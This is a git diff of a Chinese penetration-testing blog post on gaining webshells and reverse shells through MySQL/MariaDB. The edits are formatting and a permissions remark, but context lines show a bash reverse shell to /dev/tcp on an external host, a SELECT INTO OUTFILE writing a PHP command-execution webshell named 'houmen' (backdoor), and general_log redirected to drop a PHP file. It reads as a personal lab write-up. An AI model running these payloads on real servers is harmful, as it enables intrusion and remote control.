@@ -6,7 +6,7 @@ uniqueId: '2021-04-28 14:23:26/reverse-shell.html'
 mathJax: false
 date: 2021-04-28 22:23:26
 thumbnail:
-tags: [webshell,MySQL]
+tags: [webshell,MySQL,数据库]
 categories: [个人技术心得,渗透]
 keywords:
 ---
@@ -57,7 +57,7 @@ system bash -c 'bash -i &> /dev/tcp/{外部机器IP}/{端口} <&1'
 ```sql
 MariaDB root@(none):(none)> show variables like '%secure%'
 | Variable_name            | Value   |
-|:-------------------------|:--------|
+|--------------------------|---------|
 | require_secure_transport | OFF     |
 | secure_auth              | ON      |
 | secure_file_priv         |         |
@@ -88,9 +88,9 @@ select "<?php @system($_GET['cmd']);?>" into outfile '/srv/http/houmen.php';
 ```sql
 MariaDB root@(none):(none)> show variables like '%general%'
 | Variable_name    | Value            |
-|:-----------------|:-----------------|
+|------------------|------------------|
 | general_log      | OFF              |
-| general_log_file | 				  |
+| general_log_file |                  |
 ```
 
 2. 开启general_log，设置路径
@@ -100,7 +100,7 @@ MariaDB root@(none):(none)> set global general_log = 1;
 MariaDB root@(none):(none)> set global general_log_file = '/srv/http/hm.php';
 MariaDB root@(none):(none)> show variables like '%general%'
 | Variable_name    | Value            |
-|:-----------------|:-----------------|
+|------------------|------------------|
 | general_log      | ON               |
 | general_log_file | /srv/http/hm.php |
 ```
@@ -123,7 +123,9 @@ Time                Id Command  Argument
 
 > 关于服务器权限的问题：
 >
-> 在我的MANJARO系统里，httpd的用户是http，mariadb的用户是mysql，如果根目录不做任何处理，可能会存在mysql无法写入，httpd无法读取的情况
+> 在我的MANJARO系统里，httpd的用户是http，mariadb的用户是mysql，默认情况下，会存在mysql无法写入，httpd无法读取的情况
+>
+> 这些漏洞在windows上可能可以实现
 
 ## 总结
 
